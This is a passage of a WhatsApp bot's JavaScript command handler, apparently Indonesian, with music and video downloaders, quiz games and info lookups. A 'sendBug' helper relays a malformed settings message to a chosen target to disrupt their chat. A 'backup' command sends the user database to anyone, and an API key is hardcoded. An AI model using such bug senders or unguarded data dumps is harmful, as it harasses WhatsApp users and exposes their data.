contextInfo: {...m.msg.contextInfo,forwardingScore: 0, isForwarded: false, participant: other }} : {})
}

//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
mp4File = getRandom('.mp4') 
nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp4File), video, {quoted: dev, caption: "Nih"})        
fs.unlinkSync(`./${mp4File}`)
})     
}




//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
mp3File = getRandom('.mp3') 
ytdl(Link, { filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp3File), audio, {quoted: dev, caption: "Nih"})        
fs.unlinkSync(mp3File)
})       
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
mp3File = getRandom('.mp3') 
opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
  input: {
    path: mp3File
  },
  output: {
    path: opusFile,
    bitrate: 128
  }
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
   await xdev.sendMessage(from, fs.readFileSync(filePath), audio, {quoted: dev})   
   fs.unlinkSync(mp3File)
   fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
	
	
})     
}






//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp3File), document, {mimetype: "audio/mp3" , quoted: dev, filename: `${track.title}.mp3`})   
fs.unlinkSync(mp3File)
})       
} 

//Send Buggc
const sendBug = async (target) => {
await xdev.relayWAMessage(
xdev.prepareMessageFromContent(
target,
xdev.prepareDisappearingMessageSettingContent(0),
{}
),{ waitForAck: true }) 
}
 
  
 
 
//========================================================================================================================//
colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
					
if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
			
_sewa.expiredCheck(xdev, sewa)
_prem.expiredCheck(premium)

	
  // Tictactoe
if (isTicTacToe(from, tictactoe)) {
tictac(chatss, prefix, tictactoe, from, sender, setReply, mentions, addBalance, user)
}

const caklonte = async (deskripsi ) => {
caklontong1.splice(from, 1);
console.log(deskripsi)
}
//Game cak lontong    
const butckl = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}caklontong`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuCkl(xdev, caklontong, sendButMessage, butckl, caklonte)

if (game.isCkl(from, caklontong)){
if(budy.includes("yerah")){
teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanCkl(from, caklontong)}\n\n`
for (let icak of caklontong1){
 teks += `${icak}`
 }
sendButMessage(from, teks, copyright, butckl) 
caklontong.splice(game.getCklPosi(from, caklontong), 1)
caklontong1.splice(from, 1);
return
}
if (chatss.toLowerCase().includes(game.getJawabanCkl(from, caklontong))){
var htgtk = randomNomor(1500)
addBalance(senderNumber, htgtk, user)
teks = `*GAME CAK LONTONG*
Selamat jawaban kamu benar
Hadiah : Rp ${htgtk.toLocaleString()}\n\n`
for (let icak of caklontong1){
 teks += `${icak}`
 }
sendButMessage(from, teks, copyright, butckl) 
caklontong.splice(game.getCklPosi(from, caklontong), 1)
caklontong1.splice(from, 1);
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}
 
//Game tebak kata
const butkta = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakkata`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
 game.cekWaktuTK(xdev, tebakkata, sendButMessage, butkta)
if (game.isTebakKata(from, tebakkata)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTK(from, tebakkata)}`
sendButMessage(from, teks, copyright, butkta) 
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(1500)
addBalance(senderNumber, htgtk, user)
teks = `*GAME TEBAK KATA*
Selamat jawaban kamu benar
Jawaban : ${game.getJawabanTK(from, tebakkata)}
Hadiah : Rp ${htgtk.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakkata
atau tekan button di bawah ini`
sendButMessage(from, teks, copyright, butkta) 
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}
 
 //Game tebak gambar
const butgam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakgambar`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTG(xdev, tebakgambar, sendButMessage, butgam)

if (game.isTebakGambar(from, tebakgambar)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTG(from, tebakgambar)}`
sendButMessage(from, teks, copyright, butgam) 
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
var htgm = randomNomor(1500)
addBalance(senderNumber, htgm, user)
teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanTG(from, tebakgambar)}\nHadiah : Rp ${htgm.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}tebakgambar\natau tekan button di bawah ini`
sendButMessage(from, teks, copyright, butgam) 
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
} else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}

//Game Math
const butmtk = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}math easy`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuMtk(xdev, mtk, sendButMessage, butmtk)
if (game.isMtk(from, mtk)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanMtk(from, mtk)}`
sendButMessage(from, teks, copyright, butmtk) 
mtk.splice(game.getMtkPosi(from, mtk), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanMtk(from, mtk)) && !itsMe){
var htgm3 = randomNomor(1500)
addBalance(senderNumber, htgm3, user)
teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanMtk(from, mtk)}\nHadiah : Rp ${htgm3.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}math\natau tekan button di bawah ini`
sendButMessage(from, teks, copyright, butmtk) 
mtk.splice(game.getMtkPosi(from, mtk), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}    


//Game family 100
const butfam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}family100`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
 game.cekWaktuFam(xdev, family100, sendButMessage, butfam)
if (game.isfam(from, family100)){
 var anyingg = game.getjawaban100(from, family100)
 
 if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah :\n`
for (let i of anyingg){
teks += `- ${i}\n`
}
sendButMessage(from, teks, copyright, butfam) 
family100.splice(game.getfamposi(from, family100), 1)
return
}
 
for (let i of anyingg){
if (budy.toLowerCase().includes(i)){
var htgm1 = randomNomor(1500)
addBalance(senderNumber, htgm1 , user)
teks = `Selamat jawaban kamu benar\nJawaban : ${i}\nHadiah : Rp ${htgm1.toLocaleString()}\n\nJawaban yang blum tertebak : ${anyingg.length - 1}`
sendButMessage(from, teks, copyright, butfam) 
var anug = anyingg.indexOf(i)
anyingg.splice(anug, 1)
return
} else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
return
}
}

if (anyingg.length < 1){
setReply(`Semua jawaban sudah tertebak\nKirim ${prefix}family100 untuk bermain lagi`)
family100.splice(game.getfamposi(from, family100), 1)
}
}   


//Game tebak bendera
const butben = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakbendera`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTB(xdev, tebakbendera, sendButMessage, butben)

if (game.isTebakBendera(from, tebakbendera)){
if(budy.includes("Nyerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTB(from, tebakbendera)}`
sendButMessage(from, teks, copyright, butben) 
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(1500)
addBalance(senderNumber, syahira, user)
teks = `*GAME TEBAK BENDERA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTB(from, tebakbendera)}\nHadiah : Rp ${syahira.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakbendera`
sendButMessage(from, teks, copyright, butben) 
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
} else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}

//Game tebak anime
const butanim = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakanime`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTA(xdev, tebakanime, sendButMessage, butanim)
if (game.isTebakAnime(from, tebakanime)){
if(budy.includes("yerah")){
teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTA(from, tebakanime)}`
sendButMessage(from, teks, copyright, butanim) 
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(1500)
addBalance(senderNumber, vinna, user)
teks =`*GAME TEBAK ANIME*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTA(from, tebakanime)}\nHadiah : Rp ${vinna.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakanime`
sendButMessage(from, teks, copyright, butanim) 
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
} 	        

//Game tebak lirik
const butlirik = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebaklirik`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTL(xdev, tebaklirik, sendButMessage, butlirik)

if (game.isTebakLirik(from, tebaklirik)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTL(from, tebaklirik)}`
sendButMessage(from, teks, copyright, butlirik) 
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTL(from, tebaklirik)) && !itsMe){
var htgml = randomNomor(1500)
addBalance(senderNumber, htgml, user)
teks = `*GAME TEBAK LIRIK*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTL(from, tebaklirik)}\nHadiah : Rp ${htgml.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebaklirik`
sendButMessage(from, teks, copyright, butlirik) 
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
} 

//Game siapa aku
const butaku = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}siapaaku`, buttonText: { displayText: Mainlagi }, type: 1 } ];      
game.cekWaktuSA(xdev, siapaaku, sendButMessage, butaku)
   
if (game.isSiapaAku(from, siapaaku)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanSA(from, siapaaku)}`
sendButMessage(from, teks, copyright, butaku) 
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(1500)
addBalance(senderNumber, htgmu, user)
teks = `*GAME SIAPAKAH AKU*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanSA(from, siapaaku)}\nHadiah : Rp ${htgmu.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}siapakahaku`
sendButMessage(from, teks, copyright, butaku) 
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}


//AUTO RESPON SIMI BY DECODE DENPA 
if (chatBot === false && autorespon === true && !isGroup && !isCmd && !command && !dev.key.fromMe && !itsMe && !isSticker && !isAudio && !isMedia) { 
xdev.updatePresence(from, Presence.composing)
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
setReply(`${sami}`)
} 

const b1 = ["pukulin","kocok"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]

//if (atibot === true) return 
 
try{ 
switch (command) {
	






case 'lirik':
case 'lyrics':
songlyrics(q)
.then((data) => {
console.log(data)
teks =`
*Lirik Di Temukan*

${data.lyrics}

${data.source.name}
Link: ${data.source.link}
`
setReply(teks)
})
.catch(console.log) 
break

	



case 'scmp3':{
if(!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let track = await scdl.tracks.getTrack(nana);
menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlMp3(nana)
}
break
 
case 'scdoc':{
if(!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let track = await scdl.tracks.getTrack(nana);
menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlDoc(nana)
}
break
 
 
case 'scsearch':
case 'soundcloudsearch':
if(!q) return setReply("Masukan link")
scdl = await SoundCloud.create();
result = await scdl.search({
query: q,
limit: 15, 
offset: 0, 
filter: 'tracks' 
});

teks =`*SOUNDCLOUD SEARCH*`

for (let res of result.collection){
teks +=`

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
🌐 Url : ${res.permalink_url}

═════════════════
`
} 

teks +=`_Thanks for choosing SoundCloud_`

try{
anuah = result.collection[0].artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
nano = [
{"buttonId": `${prefix}scmp3 ${result.collection[0].permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${result.collection[0].permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
 break
 

 
 
case 'playmusic':
case 'p':
case 'soundcloud':
case 'playing':
if(!q) return setReply("Masukan judul lagu")
setReply(mess.wait)
if(q.startsWith("https://")){
nana = q.replace('https://m.', 'https://')
scdl = await SoundCloud.create();
let res = await scdl.tracks.getTrack(nana)
console.log(res)
teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try{
anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})

} else {

scdl = await SoundCloud.create();
 result = await scdl.search({
  query: q,
  limit: 20, 
  offset: 0, 
  filter: 'tracks' 
});

res = result.collection[0] 

try{
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err){
var artis = res.user.full_name
var album = "Tidak ada"
}
console.log(res)
teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
👤 Artis : ${artis}
💽 Album : ${album}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`

try{
anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
}
break
	
	
	
	
case 'spotify':
if(!q) return setReply("Masukan link Spotify")
data = await spotify.getTrack(q) 
teks =`
Nama: ${data.name}
Artists: ${data.artists.join(' ')}
Album : ${data.album_name}
Release: ${data.release_date}

Mohon tunggu, sedang mengirim
File audio ${data.name}
`
sendFileFromUrl (data.cover_url, image, {quoted: dev, caption: teks})      
song = await spotify.downloadTrack(q)
await xdev.sendMessage(from, song, audio, {mimetype: Mimetype.mp4Audio, quoted: dev})        
break




case 'fb':
nana = await facebookdl(q)
console.log(nana)
break


case 'fbdl':
nana = await facebookdlv2(q)
console.log(nana)
break

/*
case 'mediafire':
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(q.startsWith("https://www.mediafire.com")){
nana = await mediafiredl(q)
console.log(nana)
var teks =`
Data succesfull obtained

File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(teks)
if(nana.filesize > 30000){
if(sender.startsWith("62")){
var teks = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
} else {
var teks = "You have been banned\nfor abusing the mediafire feature"
}

addBanned(pushname,calender, senderNumber, ban) 
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 30mb")              
await setReply(teks)
return
}
await sendMediaURL (from, nana.url, "Nih")
limitAdd(senderNumber, user)
} else{
setReply("Link Invalid")
	}
break
*/
	
case 'well':{
nana = await wallpaper(q)


for (let i of nana){
//foto = i[Math.floor(Math.random() * i.length)]
//sendFileFromUrl(foto, image, {quoted: dev, caption: "Nih"})

}

}
break

	
case 'loc':
                     if(isExtream) return
            if (!isOwner) return onlyOwner()
                                       //  jpegThumbnail: virgam,
                             xdev.sendMessage(from, {
                            degreesLatitude: -7.98,
                              degreesLongitude: 118.62,
                            name: "tes",
                               address: "ahah"
                              }, location,
                              {thumnail: thumb, contextInfo:forward})
                            break
                
	
case 'backup':
await xdev.sendMessage(from,fs.readFileSync(`./database/user.json`), document, {quoted: dev, filename: "user", mimetype: 'application/json'})
break



case 'kalkulator':
try{
nana = q.replace("x","*")
nana = matematik.evaluate(nana)
teks = `${q} = ${nana}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break

case 'githubdl':
if (!args[0]) return setReply('usernamenya mana om\nContoh saipulanuar')
if (!args[1]) return setReply('repo nya mana?\nContoh v18')
let url = `https://github.com/${args[0]}/${args[1]}/archive/refs/heads/main.zip`
//ByRizkyAdi
m.reply(`waiting for compress to zip`)
xdev.sendFile(m.chat, url, 'repo.zip', null, m)
break


case 'gitclone':
try{
regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repo] = q.match(regex) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
m.reply(`*Mohon tunggu, sedang mengirim repository..*`)
xdev.sendFile(m.chat, url, filename, null, m)
} catch (err){
setReply(mess.error.link)
}
break
	
	
	
case 'weather':
if(!args[0]) setReply(" please provide place or location name")
try{
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather= res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature= res.data.main.temp_min + '°C'
let Maximum_Temperature= res.data.main.temp_max + '°C'
let Humidity= res.data.main.humidity + '%'
let Wind= res.data.wind.speed + 'km/h'
xdev.reply(m.chat,`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`.trim(),m)
}catch(e){
setReply('Lokasi tidak di temukan, silakan masukan nama negara')
 }
break
	
	
	
   
case 'totalpesan':{
let id = m.chat
let mCount = {}
let totalM = 0
await xdev.loadAllMessages(id, m => {
let user = m.key.fromMe ? xdev.user.jid : m.participant ? m.participant : id.includes('g.us') ? '' : id
if (!user) return
if (user in mCount) mCount[user]++
else mCount[user] = 1
totalM++
}, 1000)
let sorted = Object.entries(mCount).sort((a, b) => b[1] - a[1])
let pesan = sorted.map(v => `${v[0].replace(/(\d+)@.+/, '@$1')}: ${v[1]} pesan`).join('\n')
m.reply(`${totalM} pesan terakhir\n${pesan}`, false, { contextInfo: { mentionedJid: sorted.map(v => v[0]) } })
}
break


	
case 'gempanow':
ano = await gempaNow()
console.log(ano)
if(ano.length == 0) return setReply("Tidak ada info terjadi gempa hari ini")
for(let e of ano){
 teks =`Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nLatitude: ${e.latitude}\nLongitude:${e.longitude}\n`
}
setReply(teks)

break


case 'infogempa':
ani = await gempa()
console.log(ani)
teks =`*INFO GEMPA*\nTotal: ${ani.length}\n\n`
ani.map(function(e, i){
teks +=(i+1)+`. Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nPeringatan: ${e.warning}\n\n═════════════════\n\n`
 });
setReply(teks)
break
	

	
case 'jadwaltvnow':
eh = await jadwalTVNow()
console.log(eh)
teks =`*Jadwal Tv Now*\nTotal: 2\n\n`
for (let i of eh.antv){
teks +=`1. ANTV: \n${i.date} GT${i.event}\n\n═════════════════\n\n`
}
setReply(teks)
break
	
	case 'alquran':{
	let ah = await alquran()
	console.log(ah)
	}
	break
	
	case 'lonte':{
	let ah = await googleImage(q)
	console.log(ah)
	}
	break
	
	
	
	
	
	
case 'debug':
menunya = help.menu(dateIslamic, thisHit ,listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, multi, fs, isPremium, getLimit, limitCount, getBalance, senderNumber, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
mhan = await xdev.prepareMessage(from, thumb, image, {thumbnail: thumb})
res = await xdev.prepareMessageFromContent(from,{
"templateMessage": {
"hydratedTemplate": {
"imageMessage": mhan.message.imageMessage,
"hydratedContentText": menunya,
"hydratedFooterText": copyright,
"hydratedButtons": [
{
"urlButton": {
"displayText": `Script ${pushname}`,
"url": "https://github.com/dcode-denpa"
}
},{
"callButton": {
"displayText": 'Number Phone Owner',
"phoneNumber": '+62 882-9202-4190'
}
}, 
{
"quickReplyButton": {
"displayText": "List Menu",
"id": "60dd75b0081979507a679f99"
}
},
{
"quickReplyButton": {
"displayText": "Script",
"id": "60dd75b0081979507a679f99"
}
},
{
"quickReplyButton": {
"displayText": "Instagram",
"id": "60dd75b0081979507a679f99"
}
}
]
}
}
}, {}) 
xdev.relayWAMessage(res)
break




	
	
	
case 'whatmusic':
if (isQuotedAudio) {
setReply(mess.wait)
encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await xdev.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

